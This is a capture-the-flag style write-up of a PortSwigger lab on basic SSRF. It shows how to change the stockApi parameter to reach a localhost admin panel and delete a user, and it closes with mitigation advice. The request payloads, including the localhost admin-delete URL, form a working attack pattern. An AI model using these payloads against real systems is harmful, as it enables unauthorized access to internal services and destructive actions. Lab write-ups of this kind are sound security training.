# Server-Side Request Forgery (SSRF) – Internal Service Access

## Overview

The application is vulnerable to SSRF via the `stockApi` parameter. It allows the server to make requests to unintended internal or external resources.

## Lab

https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

## Steps to Reproduce

1. Intercept stock check request:

```id="z3y1m8"
POST /product/stock HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1
```

2. Modify parameter to target localhost:

```id="c4g2wq"
stockApi=http://localhost/admin
```

3. Send request and observe response.

4. Access admin delete functionality:

```id="4w8r0p"
stockApi=http://localhost/admin/delete?username=carlos
```

## Payload Used

```id="8y9k2l"
http://localhost/admin/delete?username=carlos
```

## Result

Successfully accessed internal admin panel and performed unauthorized action (deleted user `carlos`).

## Impact

Attacker can interact with internal services, bypass access controls, and potentially achieve full system compromise.

## Tools

* Burp Suite (Proxy)
* Web Browser

## Mitigation

* Validate and restrict outgoing requests (allowlist domains)
* Block access to internal IP ranges (127.0.0.1, 169.254.0.0/16, etc.)
* Disable unnecessary URL fetching features
* Implement network-level protections (firewalls, segmentation)
